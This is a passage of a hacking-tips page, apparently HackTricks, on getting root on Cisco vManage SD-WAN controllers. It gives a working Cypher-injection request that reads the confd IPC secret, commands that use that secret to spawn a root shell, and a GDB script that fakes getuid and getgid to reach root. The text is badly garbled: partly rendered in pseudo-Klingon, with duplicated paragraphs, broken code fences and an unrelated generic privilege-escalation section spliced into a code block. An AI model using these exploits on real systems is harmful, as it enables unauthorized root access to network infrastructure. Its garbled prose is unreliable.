# Cisco - vmanage

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>!</strong></a> <strong>qaStaHvIS</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* <strong>qaStaHvIS</strong> <a href="https://github.com/sponsors/carlospolop"><strong>carlospolop</strong></a> <strong>?</strong> <strong>qaStaHvIS</strong> <a href="https://github.com/sponsors/carlospolop"><strong>carlospolop</strong></a> <strong>PEASS</strong> <strong>qaStaHvIS</strong> <a href="https://github.com/sponsors/carlospolop"><strong>carlospolop</strong></a> <strong>HackTricks</strong> <strong>PDF</strong> <strong>?</strong> [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) <strong>qaStaHvIS</strong> <a href="https://opensea.io/collection/the-peass-family"><strong>The PEASS Family</strong></a> <strong>qaStaHvIS</strong> <a href="https://opensea.io/collection/the-peass-family"><strong>NFTs</strong></a> <strong>qaStaHvIS</strong> <a href="https://peass.creator-spring.com"><strong>PEASS & HackTricks swag</strong></a> <strong>qaStaHvIS</strong> [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) <strong>qaStaHvIS</strong> [**telegram group**](https://t.me/peass) <strong>qaStaHvIS</strong> <strong>Twitter</strong> 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)<strong>!</strong>
* <strong>qaStaHvIS</strong> [**hacktricks repo**](https://github.com/carlospolop/hacktricks) <strong>PRs</strong> <strong>qaStaHvIS</strong> [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) <strong>qaStaHvIS</strong> <strong>hacking tricks</strong> <strong>qaStaHvIS</strong> <strong>submitting PRs</strong> <strong>qaStaHvIS</strong> <strong>hacktricks repo</strong> <strong>qaStaHvIS</strong> <strong>hacktricks-cloud repo</strong><strong>!</strong>

</details>

## Path 1

(Example from [https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html))

After digging a little through some [documentation](http://66.218.245.39/doc/html/rn03re18.html) related to `confd` and the different binaries (accessible with an account on the Cisco website), we found that to authenticate the IPC socket, it uses a secret located in `/etc/confd/confd_ipc_secret`:
```
vmanage:~$ ls -al /etc/confd/confd_ipc_secret

-rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
```
**vmanage** user'wI' neH Neo4j instance? 'ej, 'ach, 'oH vulnerability previous using file retrieve to 'e' vaj vay':
```
GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1

Host: vmanage-XXXXXX.viptela.net



[...]

"data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
```
### Cisco-vmanage

`confd_cli` program jatlh command line arguments support vaj calls `/usr/bin/confd_cli_user` with arguments. So, we could directly call `/usr/bin/confd_cli_user` with our own set of arguments. However it's not readable with our current privileges, so we have to retrieve it from the rootfs and copy it using scp, read the help, and use it to get the shell: 

```
confd_cli_program jatlh command line arguments support vaj calls `/usr/bin/confd_cli_user` with arguments. So, we could directly call `/usr/bin/confd_cli_user` with our own set of arguments. However it's not readable with our current privileges, so we have to retrieve it from the rootfs and copy it using scp, read the help, and use it to get the shell:
```

---
```
vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret

vManage:~$ export CONFD_IPC_ACCESS_FILE=/tmp/ipc_secret

vManage:~$ /tmp/confd_cli_user -U 0 -G 0

Welcome to Viptela CLI

admin connected from 127.0.0.1 using console on vManage

vManage# vshell

vManage:~# id

uid=0(root) gid=0(root) groups=0(root)
```
## Path 2

(Example from [https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77))

The blog¹ by the synacktiv team described an elegant way to get a root shell, but the caveat is it requires getting a copy of the `/usr/bin/confd_cli_user` which is only readable by root. I found another way to escalate to root without such hassle.

When I disassembled `/usr/bin/confd_cli` binary, I observed the following:
```
vmanage:~$ objdump -d /usr/bin/confd_cli
… snipped …
40165c: 48 89 c3              mov    %rax,%rbx
40165f: bf 1c 31 40 00        mov    $0x40311c,%edi
401664: e8 17 f8 ff ff        callq  400e80 <getenv@plt>
401669: 49 89 c4              mov    %rax,%r12
40166c: 48 85 db              test   %rbx,%rbx
40166f: b8 dc 30 40 00        mov    $0x4030dc,%eax
401674: 48 0f 44 d8           cmove  %rax,%rbx
401678: 4d 85 e4              test   %r12,%r12
40167b: b8 e6 30 40 00        mov    $0x4030e6,%eax
401680: 4c 0f 44 e0           cmove  %rax,%r12
401684: e8 b7 f8 ff ff        callq  400f40 <getuid@plt>  <-- HERE
401689: 89 85 50 e8 ff ff     mov    %eax,-0x17b0(%rbp)
40168f: e8 6c f9 ff ff        callq  401000 <getgid@plt>  <-- HERE
401694: 89 85 44 e8 ff ff     mov    %eax,-0x17bc(%rbp)
40169a: 8b bd 68 e8 ff ff     mov    -0x1798(%rbp),%edi
4016a0: e8 7b f9 ff ff        callq  401020 <ttyname@plt>
4016a5: c6 85 cf f7 ff ff 00  movb   $0x0,-0x831(%rbp)
4016ac: 48 85 c0              test   %rax,%rax
4016af: 0f 84 ad 03 00 00     je     401a62 <socket@plt+0x952>
4016b5: ba ff 03 00 00        mov    $0x3ff,%edx
4016ba: 48 89 c6              mov    %rax,%rsi
4016bd: 48 8d bd d0 f3 ff ff  lea    -0xc30(%rbp),%rdi
4016c4:   e8 d7 f7 ff ff           callq  400ea0 <*ABS*+0x32e9880f0b@plt>
… snipped …
```
QawHaq "ps aux" Hoch, jImej (_ghItlh -g 100 -u 107_) jImej.
```
vmanage:~$ ps aux
… snipped …
root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
… snipped …
```
### Cisco-vmanage.md

```
I hypothesized the “confd_cli” program passes the user ID and group ID it collected from the logged in user to the “cmdptywrapper” application.

My first attempt was to run the “cmdptywrapper” directly and supplying it with `-g 0 -u 0`, but it failed. It appears a file descriptor (-i 1015) was created somewhere along the way and I cannot fake it.

As mentioned in synacktiv’s blog(last example), the `confd_cli` program does not support command line argument, but I can influence it with a debugger and fortunately GDB is included on the system.

I created a GDB script where I forced the API `getuid` and `getgid` to return 0. Since I already have “vmanage” privilege through the deserialization RCE, I have permission to read the `/etc/confd/confd_ipc_secret` directly.

root.gdb:
```

### Cisco-vmanage.md

```
jIjatlh "confd_cli" program vItlhutlh user ID je group ID vItlhutlh "cmdptywrapper" application.

vItlhutlh "cmdptywrapper" directly je -g 0 -u 0 jImej, 'ach vItlhutlh. file descriptor (-i 1015) vItlhutlh Somraw. vaj jImej.

synacktiv’s blog(last example) vItlhutlh, "confd_cli" program command line argument vItlhutlh, 'ach jImej influence vItlhutlh debugger je GDB vItlhutlh.

GDB script vItlhutlh jImej, API "getuid" je "getgid" vItlhutlh 0 qar. vaj jImej "vmanage" privilege vItlhutlh deserialization RCE vItlhutlh, "/etc/confd/confd_ipc_secret" vItlhutlh directly vItlhutlh permission vItlhutlh.
```
```
set environment USER=root
define root
finish
set $rax=0
continue
end
break getuid
commands
root
end
break getgid
commands
root
end
run
```
# Cisco vManage

## Description

Cisco vManage is a cloud-based network management platform that provides centralized control and visibility for Cisco SD-WAN deployments. It allows network administrators to monitor and configure network devices, troubleshoot issues, and manage network policies.

## Privilege Escalation

### Exploiting Misconfigurations

1. **Default Credentials**: Check if the vManage instance is using default credentials. Default usernames and passwords are often well-known and can be easily exploited.

2. **Weak Credentials**: Brute force or guess weak passwords used by the vManage instance. Use tools like Hydra or Medusa to automate the process.

3. **Unpatched Vulnerabilities**: Exploit known vulnerabilities in the vManage software. Research and identify any publicly disclosed vulnerabilities and their corresponding exploits.

### Exploiting Software Vulnerabilities

1. **Remote Code Execution**: Exploit vulnerabilities that allow remote code execution on the vManage instance. This can be achieved by exploiting vulnerabilities in the underlying software or by leveraging insecure configurations.

2. **Command Injection**: Exploit vulnerabilities that allow arbitrary command execution on the vManage instance. Look for user input that is not properly sanitized or validated before being executed as a command.

3. **File Inclusion**: Exploit vulnerabilities that allow inclusion of arbitrary files on the vManage instance. Look for file inclusion vulnerabilities that can be leveraged to read sensitive files or execute arbitrary code.

### Post-Exploitation

Once privileged access has been obtained on the vManage instance, the following actions can be performed:

1. **Data Exfiltration**: Extract sensitive data from the vManage instance, such as configuration files, user credentials, or network topology information.

2. **Persistence**: Establish persistence on the vManage instance to maintain access even after a system reboot or software update.

3. **Lateral Movement**: Explore the network to identify other devices and systems that can be compromised or used as pivot points for further attacks.

## Countermeasures

To mitigate the risk of privilege escalation on Cisco vManage, consider the following countermeasures:

1. **Strong Credentials**: Use strong, unique passwords for all user accounts on the vManage instance. Implement password complexity requirements and enforce regular password changes.

2. **Patch Management**: Keep the vManage software up to date with the latest security patches and updates. Regularly check for new vulnerabilities and apply patches as soon as they become available.

3. **Least Privilege**: Limit user privileges on the vManage instance to only what is necessary for their roles and responsibilities. Avoid using privileged accounts for routine tasks.

4. **Network Segmentation**: Implement network segmentation to isolate the vManage instance from other critical systems and devices. This can help contain the impact of a potential privilege escalation.

5. **Monitoring and Logging**: Enable logging and monitoring on the vManage instance to detect and respond to any suspicious activities or unauthorized access attempts.

6. **Security Awareness Training**: Educate network administrators and users about the risks of privilege escalation and the importance of following security best practices.

Remember that the effectiveness of these countermeasures depends on proper implementation and regular maintenance.
```
vmanage:/tmp$ gdb -x root.gdb /usr/bin/confd_cli
GNU gdb (GDB) 8.0.1
Copyright (C) 2017 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-poky-linux".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from /usr/bin/confd_cli...(no debugging symbols found)...done.
Breakpoint 1 at 0x400f40
Breakpoint 2 at 0x401000Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401689 in ?? ()Breakpoint 2, getgid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401694 in ?? ()Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401871 in ?? ()
Welcome to Viptela CLI
root connected from 127.0.0.1 using console on vmanage
vmanage# vshell
bash-4.4# whoami ; id
root
uid=0(root) gid=0(root) groups=0(root)
bash-4.4#
```
<details>

<summary><strong>qaStaHvIS AWS hacking vItlh zero to hero</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* **Do you work in a cybersecurity company**? **jImej** **HackTricks** **company advertised** **want**? **latest version of the PEASS or download HackTricks in PDF** **want**? [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) **check**!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) **Discover**, **exclusive NFTs** **collection** **our**
* [**official PEASS & HackTricks swag**](https://peass.creator-spring.com) **Get**
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) **or** [**telegram group**](https://t.me/peass) **or** **follow** **me on** **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
